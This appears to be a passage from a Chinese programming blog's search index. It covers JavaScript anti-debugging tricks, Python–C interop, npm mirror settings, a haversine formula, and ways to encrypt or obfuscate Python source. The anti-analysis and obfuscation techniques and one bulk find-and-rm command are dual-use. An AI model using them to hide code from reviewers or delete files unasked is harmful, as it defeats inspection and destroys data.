stack = \"#\", total = 0, fn =arguments.callee; while ( (fn = fn.caller) ) { stack = stack + \"\" +fn.name; total++ } return stack}function test1() { console.log(getCallStack());}function test2() { test1();}function test3() { test2();}function test4() { test3();}test4(); 执行此代码时，您将看到字符串 #test1test2test3test4 。如果我们修改（我邀请您这样做）任何函数的名称，返回的字符串也将不同。我们可以使用该字符串计算安全哈希，然后将其用作种子，以得出用于解密其他代码块的密钥。有趣的是，如果由于密钥无效（分析人员更改了函数名称）而无法解密下一个代码块，则可以捕获异常并将执行流重定向到伪路径。 VM50:10 #test1test2test3test4 请记住，此技巧需要与强大的混淆功能结合在一起才能使用。 隐式代码完整性控制&nbsp; 在 “ 函数重新定义” 部分的结尾，我们提到可以使用 toString（）方法检索 JavaScript 中函数的代码。就像我们说过的那样，这对于检查函数是否已重新定义很有用，实际上，可以使用相同的想法来知道函数的代码是否被修改。 效果较差的方法是计算函数或代码块的哈希并将其与已知表进行比较。但是这种方法确实很愚蠢。一种更现实，更有效的方法可以重复使用我们之前在堆栈跟踪中使用的相同策略。我们可以计算代码块的哈希值，并将其用作解密其他代码块的密钥。 创建隐式完整性控件的最漂亮方法是在 md5 中使用冲突。基本上，我们可以创建在自己的函数中测试其自己的 md5 的函数。为了在功能内执行检查，我们需要进行碰撞处理（我们想创建类似的东西 function(){ if (md5(arguments.callee.toString() === '&lt;md5&gt;') code_function; } )。 该技术背后的概念与用于生成图像文件的概念相同，在自己的图片中显示了 md5 校验和。这是一个经典示例：显示自己的 md5 校验和的 gif。 (注: 本站的图片处理策略可能更改了图片 md5 值, 点击查看原图 =&gt;&nbsp;显示自己的 md5 校验和的 gif) 关于如何产生这种冲突，有大量的文章（甚至在 PoC || GTFO 中出现了一些示例），但是我阅读并可以复制的第一个文章是使用 PHP 编写的。您可以非常快速地预先计算生成碰撞所需的块。实际上，这是@cgvwzq 创建的示例，通过这种方式检查了函数内容的完整性。 如前所述，我们需要对这种技术进行强力混淆。 代理对象 (old, 已弃用)代理对象是目前 JavaScript 中最有用的一个工具，这种对象可以帮助我们了解代码中的其他对象，包括修改其行为以及触发特定环境下的对象活动。比如说，我们可以创建一个嗲哩对象并跟踪每一次document.createElement调用，然后记录下相关信息： const handler = { // Our hook to keep the track apply: function (target, thisArg, args){ console.log(\"Intercepted a call tocreateElement with args: \" + args); return target.apply(thisArg, args) }} document.createElement= new Proxy(document.createElement, handler) // Create our proxy object withour hook ready to interceptdocument.createElement('div'); 接下来，我们可以在控制台中记录下相关参数和信息： VM216:3 Intercepted a call tocreateElement with args: div 我们可以利用这些信息并通过拦截某些特定函数来调试代码，但是本文的主要目的是为了介绍反调试技术，那么我们如何检测 “对方” 是否使用了代理对象呢？其实这就是一场 “猫抓老鼠” 的游戏，比如说，我们可以使用相同的代码段，然后尝试调用 toString 方法并捕获异常： //Call a \"virgin\" createElement:try { document.createElement.toString();}catch(e){ console.log(\"I saw your proxy!\");} 信息如下： \"function createElement() { [native code] }\" 但是当我们使用了代理之后： //Then apply the hookconst handler = { apply: function (target, thisArg, args){ console.log(\"Intercepted a call tocreateElement with args: \" + args); return target.apply(thisArg, args) }}document.createElement= new Proxy(document.createElement, handler); //Callour not-so-virgin-after-that-party createElementtry { document.createElement.toString();}catch(e) { console.log(\"I saw your proxy!\");} 没错，我们确实可以检测到代理： VM391:13 I saw your proxy! 我们还可以添加 toString 方法： const handler = { apply: function (target, thisArg, args){ console.log(\"Intercepted a call tocreateElement with args: \" + args); return target.apply(thisArg, args) }}document.createElement= new Proxy(document.createElement, handler);document.createElement= Function.prototype.toString.bind(document.createElement); //Add toString//Callour not-so-virgin-after-that-party createElementtry { document.createElement.toString();}catch(e) { console.log(\"I saw your proxy!\");} 现在我们就没办法检测到了： \"function createElement() { [native code] }\" 代理对象异常把戏不能再使用了。幸运的是，我们仍然可以通过 toString 长度检测代理对象的使用。例如，document.createElement的大小为 42（Chrome）： document.createElement.toString().length42 另一方面，当我们创建代理时，此值将更改： const handler = { apply: function(target, thisArg, args) { console.log(\"Intercepted call\"); return target.apply(thisArg, args); }}document.createElement = new Proxy(document.createElement, handler);document.createElement.toString().length29 因此，我们可以执行以下操作： if (document.createElement.toString().length &lt; 30) { console.log(\"I saw your proxy\");}else { console.log(\"Not a proxy\");} 此技巧不能在 windoww 对象中使用，但仍然有用。 限制环境如引言中所述，我们想要做的一件事就是尝试检测代码是否在正确的环境中执行。我们所谓的 “正确的环境” 是： 该代码正在浏览器（不是仿真器，不是 NodeJS 等）中执行。 该代码正在指定给它的域 / 资源中执行（不是本地服务器） 例如，我们可以用来证明代码是否在本地执行的简单检查是： // Pretty stupid idea found in commercial softwareif (location.hostname === \"localhost\" || location.hostname === \"127.0.0.1\" || location.hostname === \"\") { console.log(\"Don't run me here!\")} 如果我们在本地 html 中运行此 JavaScript 代码段，则会看到以下消息： VM28:3 Don't run me here! 按照这个想法，另一个检查选项是用于打开文档的处理程序（类似 if (location.protocol == 'file:'){...}），或者尝试通过 HTTP 请求进行测试，以确定是否有其他资源（图像，css 等）可用。当然，所有这些方法都非常容易被绕过。&nbsp;如果代码是在 NodeJS 中执行的（或者正如我们在本文中提到的：将流更改为伪造的路径），则可以避免执行代码。这很危险，但是我在野外看到使用 NodeJS 来解决 JavaScript 挑战并绕过反暴力缓解措施。我们可以尝试检测仅存在于浏览器上下文中的对象的存在： //Under NodeJS try { console.log(window); } catch(e){ console.log(\"NodeJS detected!!!!\"); } NodeJS detected!!!! 反之亦然：在 NodeJS 中，我们具有浏览器上下文中不存在的对象。 //Under the browserconsole.log(global)VM104:1 Uncaught ReferenceError: global is not defined at &lt;anonymous&gt;:1:13//Under NodeJS console.log(global){ console: Console { log: [Function: bound log],... ... 我们可以搜索仅存在于浏览器中的大量元数据。我们可以检索到的一些此类想法可以在 Panopticlick Project 中看到。 相关文献javascript-antidebugging","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://blog.mhuig.top/categories/JavaScript/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://blog.mhuig.top/tags/JavaScript/"},{"name":"反调试","slug":"反调试","permalink":"https://blog.mhuig.top/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"}]},{"title":"Python 如何调用 C","slug":"Python/Python如何调用C","date":"2020-02-24T07:45:30.000Z","updated":"2020-02-24T07:45:30.000Z","comments":true,"path":"p/b6ffaac2/","permalink":"https://blog.mhuig.top/p/b6ffaac2/","excerpt":"Python 语言特点：简单，明确，优雅，高效率，同时 Python 语言的可扩展性和可嵌入性很强，又被成为 “胶水语言”。但是 Python 语言有一个最大的缺点，便是运行速度慢，所以当你对速度有要求时，你可以用 C 语言来编写你的关键代码，或者当你希望某些算法不公开时，也可以把你的程序用 C 编写，然后在你的 Python 程序中使用它们。本文将介绍在 Python 程序中如何调用 C…","text":"Python 语言特点：简单，明确，优雅，高效率，同时 Python 语言的可扩展性和可嵌入性很强，又被成为 “胶水语言”。但是 Python 语言有一个最大的缺点，便是运行速度慢，所以当你对速度有要求时，你可以用 C 语言来编写你的关键代码，或者当你希望某些算法不公开时，也可以把你的程序用 C 编写，然后在你的 Python 程序中使用它们。本文将介绍在 Python 程序中如何调用 C… 编写 C 语言代码一个简单的 c 语言程序，实现了两个整数的加法运算 #include &lt;stdio.h&gt;int sum(int a,int b){ return a + b;} 生成 so 库文件使用命令： gcc -fPIC -shared main.c -o lib.so so 库文件不能跨平台使用，如果你在 Windows 下面生成的，便只能够在 Windows 下面使用，使用命令以后，生成后缀为.so 的库文件 编写 Python 程序来调用 C 语言 把 so 库文件放入我们的 Python 项目中 使用 ctypes 库中的 CDLL 来加载库 lib_main = CDLL (‘so 库文件路径’) 调用 C sum_value = lib_main.sum(10, 20) # ctypes的库from ctypes import *# 加载so库lib_main = CDLL('./lib.so') # CDLL加载库sum_value = lib_main.sum(10, 20)print(sum_value) 最终得到结果 30 ctypes 库是 Python 提供的一个外部函数库，提供 C 语言兼容集中数据类型，可以允许调用 C 编译好的库，已下附上 ctypes 库官方文档：https://docs.python.org/3/library/ctypes.html","categories":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"}]},{"title":"Npm 更换源","slug":"web/npm更换源","date":"2020-02-23T11:02:43.000Z","updated":"2020-02-23T11:02:43.000Z","comments":true,"path":"p/ba036091/","permalink":"https://blog.mhuig.top/p/ba036091/","excerpt":"由于 npm 的源在国外，所以国内用户使用起来有很多不方便，比如拖慢下载速度。","text":"由于 npm 的源在国外，所以国内用户使用起来有很多不方便，比如拖慢下载速度。 如何使用有很多方法来配置 npm registry 地址，下面根据不同情境列出几种比较常用的方法。以淘宝 npm 为例 更换为淘宝 npm 源npm config set registry http://registry.npmmirror.com 使用 npm 官方镜像npm config set registry https://registry.npmjs.org/ NPM 检查并更新项目依赖的版本#### 安装npm install -g npm-check-updates#### 检查当前目录下可更新的依赖项ncu#### 升级 package.jsonncu -u#### 根据更新的 package.json 安装新版本npm install 已知的 npm 镜像源目前国内除了淘宝（npmmirror），已知的 npm 镜像源还有： 华为云 https://mirrors.huaweicloud.com/home 腾讯云 https://mirrors.cloud.tencent.com/help/npm.html 南京邮电大学（NJUPT） https://mirrors.njupt.edu.cn/help/npm/ 浙江大学 https://mirrors.zju.edu.cn/npm/ 已知的 Nodejs 预编译包： 教育网内可去 https://mirrorz.org/list/nodejs-release 任选 华为云 https://repo.huaweicloud.com/nodejs/ 淘宝 NPM 镜像站喊你切换新域名啦【公告】淘宝 npm 域名即将切换 &amp;&amp; npmmirror 重构升级https://zhuanlan.zhihu.com/p/465424728 【望周知】淘宝 NPM 镜像站喊你切换新域名啦https://zhuanlan.zhihu.com/p/430580607 要点总结如下： 淘宝 NPM 镜像站品牌升级，新品牌为 npmmirror （NPM 中国镜像站）。 广为人知的淘宝 NPM 镜像老域名（*.npm.taobao.org）将在 2022.06.30 号正式下线和停止 DNS 解析。 涉及到的域名迁移如下： http://npm.taobao.org =&gt; http://npmmirror.comhttp://registry.npm.taobao.org =&gt; http://registry.npmmirror.com 可能产生的大影响：简而言之，所有写死的都得换。企业用户需要联系 网管/IT/SRE 更新防火墙白名单。存量应用的 lock 文件，开发者需要自行执行 sed 等指令去替换或重新生成。本地 npmrc 里面的 registry 地址（如果有，则）需要开发者自行更新。 本文已经过时的内容备份 2022.02.12 移除内容## 如何使用有很多方法来配置npm registry地址，下面根据不同情境列出几种比较常用的方法。以淘宝npm为例### 临时使用``bashnpm --registry https://registry.npm.taobao.org install express``### 持久使用``bashnpm config set registry https://registry.npm.taobao.org``配置后可通过下面方式来验证是否成功：``bashnpm config get registry``或者``bashnpm info express``### 更换为淘宝npm源``bashnpm install -g cnpm --registry=https://registry.npm.taobao.org``通过cnpm更新模块``bashcnpm install expresstall express``### 使用官方镜像``bashnpm config set registry https://registry.npmjs.org/``## 总结更换为淘宝npm源``bashnpm config set registry https://registry.npm.taobao.org``使用官方镜像``bashnpm config set registry https://registry.npmjs.org/``NPM检查并更新项目依赖的版本``bash#### 安装npm install -g npm-check-updates#### 检查当前目录下可更新的依赖项ncu#### 升级 package.jsonncu -u#### 根据更新的 package.json 安装新版本npm install``","categories":[{"name":"npm","slug":"npm","permalink":"https://blog.mhuig.top/categories/npm/"}],"tags":[{"name":"npm","slug":"npm","permalink":"https://blog.mhuig.top/tags/npm/"}]},{"title":"LBS 球面距离公式","slug":"math/LBS 球面距离公式","date":"2020-02-23T01:40:32.000Z","updated":"2020-02-23T01:40:32.000Z","comments":true,"path":"p/5e7ad437/","permalink":"https://blog.mhuig.top/p/5e7ad437/","excerpt":"","text":"维基百科推荐使用 Haversine 公式，理由是 Great-circle distance 公式用到了大量余弦函数， 而两点间距离很短时（比如地球表面上相距几百米的两点），余弦函数会得出 的结果， 会导致较大的舍入误差。而 Haversine 公式采用了正弦函数，即使距离很小，也能保持足够的有效数字。 以前采用三角函数表计算时的确会有这个问题，但经过实际验证，采用计算机来计算时，两个公式的区别不大。 稳妥起见，这里还是采用 Haversine 公式。 Haversine 公式 其中 为地球半径，可取平均值 6371.137km , 表示两点的纬度； 表示两点经度的差值。 距离计算函数下面就是计算球面间两点 (lat0, lng)-(lat1, lng1) 之间距离的函数。 from math import sin, asin, cos, radians, fabs, sqrt EARTH_RADIUS=6371 # 地球平均半径，6371km def hav(theta): s = sin(theta / 2) return s * s def get_distance_hav(lat0, lng0, lat1, lng1): \"用haversine公式计算球面两点间的距离。\" # 经纬度转换成弧度 lat0 = radians(lat0) lat1 = radians(lat1) lng0 = radians(lng0) lng1 = radians(lng1) dlng = fabs(lng0 - lng1) dlat = fabs(lat0 - lat1) h = hav(dlat) + cos(lat0) * cos(lat1) * hav(dlng) distance = 2 * EARTH_RADIUS * asin(sqrt(h)) return distance 相关文献LBS 球面距离公式","categories":[{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/categories/Math/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://blog.mhuig.top/tags/Python/"},{"name":"Math","slug":"Math","permalink":"https://blog.mhuig.top/tags/Math/"},{"name":"距离","slug":"距离","permalink":"https://blog.mhuig.top/tags/%E8%B7%9D%E7%A6%BB/"}]},{"title":"","slug":"notes/NoSQL","date":"2020-02-08T23:56:00.000Z","updated":"2022-05-12T23:56:00.000Z","comments":false,"path":"p/notes-nosql/","permalink":"https://blog.mhuig.top/p/notes-nosql/","excerpt":"","text":".fa-secondary{opacity:.4} NoSQL NoSQL 开始阅读","categories":[{"name":"大数据","slug":"大数据","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/"},{"name":"NoSQL","slug":"大数据/NoSQL","permalink":"https://blog.mhuig.top/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE/NoSQL/"}],"tags":[{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.mhuig.top/tags/NoSQL/"}]},{"title":"如何加密你的 Python 代码","slug":"Python/如何加密你的 Python 代码","date":"2020-02-05T05:08:17.000Z","updated":"2020-02-05T05:08:17.000Z","comments":true,"path":"p/b190dcb/","permalink":"https://blog.mhuig.top/p/b190dcb/","excerpt":"讲述了如何通过修改 Python 解释器达到加解密 Python 代码的目的。","text":"讲述了如何通过修改 Python 解释器达到加解密 Python 代码的目的。 前言本文将首先介绍下现有源码加密方案的思路、方法、优点与不足，进而介绍如何通过定制 Python 解释器来达到更好地加解密源码的目的。 现有加密方案由于 Python 的动态特性和开源特点，导致 Python 代码很难做到很好的加密。社区中的一些声音认为这样的限制是事实，应该通过法律手段而不是加密源码达到商业保护的目的；而还有一些声音则是不论如何都希望能有一种手段来加密。于是乎，人们想出了各种或加密、或混淆的方案，借此来达到保护源码的目的。 常见的源码保护手段有如下几种： 发行 .pyc 文件 代码混淆 使用 py2exe 使用 Cython 下面来简单说说这些方案。 发行 .pyc 文件思路大家都知道，Python 解释器在执行代码的过程中会首先生成 .pyc 文件，然后解释执行 .pyc 文件中的内容。当然了，Python 解释器也能够直接执行 .pyc 文件。而 .pyc 文件是二进制文件，无法直接看出源码内容。如果发行代码到客户环境时都是 .pyc 而非 .py 文件的话，那岂不是能达到保护 Python 代码的目的？ 方法把 .py 文件编译为 .pyc 文件，是件非常轻松地事情，可不需要把所有代码跑一遍，然后去捞生成的 .pyc 文件。 事实上，Python 标准库中提供了一个名为 compileall 的库，可以轻松地进行编译。 执行如下命令能够将遍历 目录下的所有 .py 文件，将之编译为 .pyc 文件： python -m compileall &lt;src&gt; 然后删除 目录下所有 .py 文件就可以打包发布了： find &lt;src&gt; -name '*.py' -type f -print -exec rm {} \\; 优点 简单方便，提高了一点源码破解门槛 平台兼容性好，.py 能在哪里运行，.pyc 就能在哪里运行 不足 解释器兼容性差，.pyc 只能在特定版本的解释器上运行 有现成的反编译工具，破解成本低 python-uncompyle6 就是这样一款反编译工具，效果出众。 执行如下命令，即可将 .pyc 文件反编译为 .py 文件： uncompyle6 *compiled-python-file-pyc-or-pyo* 代码混淆如果代码被混淆到一定程度，连作者看着都费劲的话，是不是也能达到保护源码的目的呢？ 思路既然我们的目的是混淆，就是通过一系列的转换，让代码逐渐不那么让人容易明白，那就可以这样下手： 移除注释和文档。没有这些说明，在一些关键逻辑上就没那么容易明白了。 改变缩进。完美的缩进看着才舒服，如果缩进忽长忽短，看着也一定闹心。 在 tokens 中间加入一定空格。这就和改变缩进的效果差不多。 重命名函数、类、变量。命名直接影响了可读性，乱七八糟的名字可是阅读理解的一大障碍。 在空白行插入无效代码。这就是障眼法，用无关代码来打乱阅读节奏。 方法方法一：使用 oxyry 进行混淆http://pyob.oxyry.com/ 是一个在线混淆 Python 代码的网站，使用它可以方便地进行混淆。 假定我们有这样一段 Python 代码，涉及到了类、函数、参数等内容： # coding: utf-8class A(object): \"\"\" Description \"\"\" def __init__(self, x, y, default=None): self.z = x + y self.default = default def name(self): return 'No Name'def always(): return Truenum = 1a = A(num, 999, 100)a.name()always() 经过 Oxyry 的混淆，得到如下代码： class A (object ):#line:4 \"\"#line:7 def __init__ (O0O0O0OO00OO000O0 ,OO0O0OOOO0000O0OO ,OO0OO00O00OO00OOO ,OO000OOO0O000OOO0 =None ):#line:9 O0O0O0OO00OO000O0 .z =OO0O0OOOO0000O0OO +OO0OO00O00OO00OOO #line:10 O0O0O0OO00OO000O0 .default =OO000OOO0O000OOO0 #line:11 def name (O000O0O0O00O0O0OO ):#line:13 return 'No Name'#line:14def always ():#line:17 return True #line:18num =1 #line:21a =A (num ,999 ,100 )#line:22a .name ()#line:23always () 混淆后的代码主要在注释、参数名称和空格上做了些调整，稍微带来了点阅读上的障碍。 方法二：使用 pyobfuscate 库进行混淆pyobfuscate 算是一个颇具年头的 Python 代码混淆库了，但却是 “老当益壮” 了。 对上述同样一段 Python 代码，经 pyobfuscate 混淆后效果如下： # coding: utf-8if 64 - 64: i11iIiiIiiif 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIiclass o0OO00 ( object ) : if 78 - 78: i11i . oOooOoO0Oo0O if 10 - 10: IIiI1I11i11 if 54 - 54: i11iIi1 - oOo0O0Ooo if 2 - 2: o0 * i1 * ii1IiI1i % OOooOOo / I11i / Ii1I def __init__ ( self , x , y , default = None ) : self . z = x + y self . default = default if 48 - 48: iII111i % IiII + I1Ii111 / ooOoO0o * Ii1I def name ( self ) : return 'No Name' if 46 - 46: ooOoO0o * I11i - OoooooooOO if 30 - 30: o0 - O0 % o0 - OoooooooOO * O0 * OoooooooOOdef Oo0o ( ) : return True if 60 - 60: i1 + I1Ii111 - I11i / i1IIi if 40 - 40: oOooOoO0Oo0O / O0 % ooOoO0o + O0 * i1IIiI1Ii11I1Ii1i = 1Ooo = o0OO00 ( I1Ii11I1Ii1i , 999 , 100 )Ooo . name ( )Oo0o ( ) # dd678faae9ac167bc83abf78e5cb2f3f0688d3a3 相比于方法一，方法二的效果看起来更好些。除了类和函数进行了重命名、加入了一些空格，最明显的是插入了若干段无关的代码，变得更加难读了。 优点 简单方便，提高了一点源码破解门槛 兼容性好，只要源码逻辑能做到兼容，混淆代码亦能 不足 只能对单个文件混淆，无法做到多个互相有联系的源码文件的联动混淆 代码结构未发生变化，也能获取字节码，破解难度不大 使用 py2exe思路py2exe 是一款将 Python 脚本转换为 Windows 平台上的可执行文件的工具。其原理是将源码编译为 .pyc 文件，加之必要的依赖文件，一起打包成一个可执行文件。 如果最终发行由 py2exe 打包出的二进制文件，那岂不是达到了保护源码的目的？ 方法使用 py2exe 进行打包的步骤较为简便。 1. 编写入口文件。本示例中取名为 hello.py： print 'Hello World' 2. 编写 setup.py： from distutils.core import setupimport py2exesetup(console=['hello.py']) 3. 生成可执行文件 python setup.py py2exe 生成的可执行文件位于 dist\\hello.exe。 优点 能够直接打包成 exe，方便分发和执行 破解门槛比 .pyc 更高一些 不足 兼容性差，只能运行在 Windows 系统上 生成的可执行文件内的布局是明确、公开的，可以找到源码对应的 .pyc 文件，进而反编译出源码 使用 Cython思路虽说 Cython 的主要目的是带来性能的提升，但是基于它的原理：将 .py/.pyx 编译为 .c 文件，再将 .c 文件编译为 .so(Unix) 或 .pyd(Windows)，其带来的另一个好处就是难以破解。 方法使用 Cython 进行开发的步骤也不复杂。 1. 编写文件 hello.pyx 或 hello.py： def hello(): print('hello') 2. 编写 setup.py： from distutils.core import setupfrom Cython.Build import cythonizesetup(name='Hello World app', ext_modules=cythonize('hello.pyx')) 3. 编译为 .c，再进一步编译为 .so 或 .pyd： python setup.py build_ext --inplace 执行 python -c \"from hello import hello;hello ()\" 即可直接引用生成的二进制文件中的 hello () 函数。 优点 生成的二进制 .so 或 .pyd 文件难以破解 同时带来了性能提升 不足 兼容性稍差，对于不同版本的操作系统，可能需要重新编译 虽然支持大多数 Python 代码，但如果一旦发现部分代码不支持，完善成本较高 定制 Python 解释器考虑前文所述的几个方案，均是从源码的加工入手，或多或少都有些不足。假设我们从解释器的改造入手，会不会能够更好的保护代码呢？ 由于发行商业 Python 程序到客户环境时通常会包含一个 Python 解释器，如果改造解释器能解决源码保护的问题，那么也是可选的一条路。 假定我们有一个算法，能够加密原始的 Python 代码，这些加密后代码随发行程序一起，可被任何人看到，却难以破解。另一方面，有一个定制好的 Python 解释器，它能够解密这些被加密的代码，然后解释执行。而由于 Python 解释器本身是二进制文件，人们也就无法从解释器中获取解密的关键数据。从而达到了保护源码的目的。 要实现上述的设想，我们首先需要掌握基本的加解密算法，其次探究 Python 执行代码的方式从而了解在何处进行加解密，最后禁用字节码用以防止通过 .pyc 反编译。 加解密算法对称密钥加密算法对称密钥加密（Symmetric-key algorithm）又称为对称加密、私钥加密、共享密钥加密，是密码学中的一类加密算法。这类算法在加密和解密时使用相同的密钥，或是使用两个可以简单地相互推算的密钥。 对称加密算法的特点是算法公开、计算量小、加密速度快、加密效率高。 常见的对称加密算法有：DES、3DES、AES、Blowfish、IDEA、RC5、RC6 等。 对称密钥加解密过程如下： 明文通过密钥加密成密文，密文也可通过相同的密钥解密为明文。 通过 openssl 工具，我们能够方便选择对称加密算法进行加解密。下面我们以 AES 算法为例，介绍其用法。 AES 加密指定密码进行对称加密 openssl enc -aes-128-cbc -in test.py -out entest.py -pass pass:123456 指定文件进行对称加密 openssl enc -aes-128-cbc -in test.py -out entest.py -pass file:passwd.txt 指定环境变量进行对称加密 openssl enc -aes-128-cbc -in test.py -out entest.py -pass env:passwd AES 解密指定密码进行对称解密 openssl enc -aes-128-cbc -d -in entest.py -out test.py -pass pass:123456 指定文件进行对称解密 openssl enc -aes-128-cbc -d -in entest.py -out test.py -pass file:passwd.txt 指定环境变量进行对称解密 openssl enc -aes-128-cbc -d -in entest.py -out test.py -pass env:passwd 非对称密钥加密算法密钥加密（英语：public-key cryptography，又译为公开密钥加密），也称为非对称加密（asymmetric cryptography），一种密码学算法类型，在这种密码学方法中，需要一对密钥，一个是私钥，另一个则是公钥。这两个密钥是数学相关，用某用户公钥加密后所得的信息，只能用该用户的私钥才能解密。 非对称加密算法的特点是算法强度复杂、安全性依赖于算法与密钥但是由于其算法复杂，而使得加密解密速度没有对称加密解密的速度快。 常见的对称加密算法有：RSA、Elgamal、背包算法、Rabin、D - H、ECC 等。 非对称密钥加解密过程如下： 明文通过公钥加密成密文，密文通过与公钥对应的私钥解密为明文。 通过 openssl 工具，我们能够方便选择非对称加密算法进行加解密。下面我们以 RSA 算法为例，介绍其用法。 生成私钥、公钥辅以 AES-128 算法，生成 2048 比特长度的私钥 openssl genrsa -aes128 -out private.pem 2048 根据私钥来生成公钥 openssl rsa -in private.pem -outform PEM -pubout -out public.pem RSA 加密使用公钥进行加密 openssl rsautl -encrypt -in passwd.txt -inkey public.pem -pubin -out enpasswd.txt RSA 解密使用私钥进行解密 openssl rsautl -decrypt -in enpasswd.txt -inkey private.pem -out passwd.txt 基于加密算法实现源码保护对称加密适合加密源码文件，而非对称加密适合加密密钥。如果将两者结合，就能达到加解密源码的目的。 在构建环境进行加密我们发行出去安装包中，源码应该是被加密过的，那么就需要在构建阶段对源码进行加密。加密的过程如下： 1. 随机生成一个密钥。这个密钥实际上是一个用于对称加密的密码。 2. 使用该密钥对源代码进行对称加密，生成加密后的代码。 3. 使用公钥（生成方法见 非对称密钥加密算法）对该密钥进行非对称加密，生成加密后的密钥。 不论是加密后的代码还是加密后的密钥，都会放在安装包中。它们能够被用户看到，却无法被破译。而 Python 解释器该如何执行加密后的代码呢？ Python 解释器进行解密假定我们发行的 Python 解释器中内置了与公钥相对应的私钥，有了它就有了解密的可能。而由于 Python 解释器本身是二进制文件，所以不需要担心内置的私钥会被看到。解密的过程如下： 1.Python 解释器执行加密代码时需要被传入指示加密密钥的参数，通过这个参数，解释器获取到了加密密钥 2.Python 解释器使用内置的私钥，对该加密密钥进行非对称解密，得到原始密钥 3.Python 解释器使用原始密钥对加密代码进行对称解密，得到原始代码 4.Python 解释器执行这段原始代码 可以看到，通过改造构建环节、定制 Python 解释器的执行过程，便可以实现保护源码的目的。改造构建环节是容易的，但是如何定制 Python 解释器呢？我们需要深入了解解释器执行脚本和模块的方式，才能在特定的入口进行控制。 脚本、模块的执行与解密执行 Python 代码的几种方式为了找到 Python 解释器执行 Python 代码时的所有入口，我们需要首先执行 Python 解释器都能以怎样的方式执行代码。 直接运行脚本python test.py 直接运行语句python -c \"print 'hello'\" 直接运行模块python -m test 导入、重载模块python&gt;&gt;&gt; import test # 导入模块&gt;&gt;&gt; reload(test) # 重载模块 直接运行语句 的方式接收的就是明文的代码，我们也无需对这种方式做额外处理。直接运行模块和导入、重载模块这两种方式在流程上是殊途同归的，所以接下来会一起来看。因此我们将分两种情况：运行脚本和加载模块来进一步探究各自的过程和解密方式。 运行脚本时解密运行脚本的过程Python 解释器在运行脚本时的代码调用逻辑如下： main WinMain[Modules/python.c] [PC/WinMain.c] \\ / \\ / \\ / \\ / \\ / Py_Main [Moduls/main.c] Python 解释器运行脚本的入口函数因操作系统而异，在 Linux/Unix 系统上，主入口函数是 Modules/python.c 中的 main 函数，在 Windows 系统上，则是 PC/WinMain.c 中的 WinMain 函数。不过这两个函数最终都会调用 Moduls/main.c 中的 Py_Main 函数。 我们不妨来看看 Py_Main 函数中的相关逻辑： [Modules/Main.c]--------------------------------------intPy_Main(int argc, char **argv){ if (command) { // 处理 python -c &lt;command&gt; } else if (module) { // 处理 python -m &lt;module&gt; } else { // 处理 python &lt;file&gt; ... fp = fopen(filename, \"r\"); ... } 处理和的部分我们暂且先不管，在处理文件（通过直接运行脚本的方式）的逻辑中，可以看到解释打开了文件，获得了文件指针。那么如果我们把这里的 fopen 换成是自定义的 decrypt_open 函数，这个函数用来打开一个加密文件，然后进行解密，并返回一个文件指针，这个指针指向解密后的文件。那么，不就可以实现解密脚本的目的了吗？ 自定义 decrypt_open我们不妨新增一个 Modules / crypt.c 文件，用来存放一些自定义的加解密函数。 decrypt_open 函数大概实现如下： [Modules/crypt.c]--------------------------------------/* 以解密方式打开文件 */FILE *decrypt_open(const char *filename, const char *mode){ int plainlen = -1; char *plaintext = NULL; FILE *fp = NULL; if (aes_passwd == NULL) fp = fopen(filename, \"r\"); else { plainlen = aes_decrypt(filename, aes_passwd, &amp;plaintext); // 如果无法解密，返回源文件描述符 if (plainlen &lt; 0) fp = fopen(filename, \"r\"); // 否则，转换为内存文件描述符 else fp = fmemopen(plaintext, plainlen, \"r\"); } return fp;} 这里的 aes_passwd 是一个全局变量，代表对称加密算法中的密钥。我们暂时假定已经获取该密钥了，后文会说明如何获得。而 aes_decrypt 是自定义的一个使用 AES 算法进行对称解密的函数，限于篇幅，此函数的实现不再贴出。 decrypt_open 逻辑如下： 判断是否获得了对称密钥，如果没获得，直接打开该文件并返回文件指针 如果获得了，则尝试使用对称算法进行解密 如果解密失败，可能就是一段非加密的脚本，直接打开该文件并返回文件指针 如果解密成功，我们通过解密后的内容创建一个内存文件对象，并返回该文件指针实现了上述这些函数后，我们就能够实现在直接运行脚本时，解密执行被加密代码的目的。 加载模块时解密加载模块的过程加载模块的逻辑主要实现在 Python / import.c 文件中，其过程如下： Py_Main [Moduls/main.c] | builtin___import__ RunModule | |PyImport_ImportModuleLevel &lt;----┐ PyImport_ImportModule | | | import_module_level └------- PyImport_Import | load_next builtin_reload | | import_submodule PyImport_ReloadModule | | find_module &lt;---------------------------┘ 通过 python -m 的方式来加载模块时，其入口函数是 Py_Main 函数 通过 import 的方式来加载模块时，其入口函数是 builtin___import__ 函数 通过 reload () 的方式来加载模块时，其入口函数是 builtin_reload 函数 但不论是哪种方式，最终都会调用 find_module 函数，我们看看这个函数中是否暗藏乾坤呢？ [Python/import.c]--------------------------------------static struct filedescr *find_module(char *fullname, char *subname, PyObject *path, char *buf, size_t buflen, FILE **p_fp, PyObject **p_loader){ ... fp = fopen(buf, filemode); ...} 我们在 find_module 函数中找到了打开文件的逻辑，如果直接改成前文实现的 decrypt_open，岂不是就能达成加载模块时解密的目的了？ 总体思路是这样的，但有个细节需要注意，buf 不一定就是 .py 文件，也可能是 .pyc 文件，我们只对 .py 文件做改动，则可以这么写： [Python/import.c]--------------------------------------static struct filedescr *find_module(char *fullname, char *subname, PyObject *path, char *buf, size_t buflen, FILE **p_fp, PyObject **p_loader){ ... if (fdp-&gt;type == PY_SOURCE) { fp = decrypt_open(buf, filemode); } else { fp = fopen(buf, filemode); } ...} 经过上述改动，就实现了加载模块时解密的目的了。 支持指定密钥文件前文中还留有一个待解决的问题：我们一开始是假定解释器已获取到了密钥内容并存放在了全局变量 aes_passwd 中，那么密钥内容怎么获取呢？ 我们需要 Python 解释器能支持一个新的参数选项，通过它来指定已加密的密钥文件，然后再通过非对称算法进行解密，得到 aes_passed。 假定这个参数选项是 -k ，则可使用如 python -k 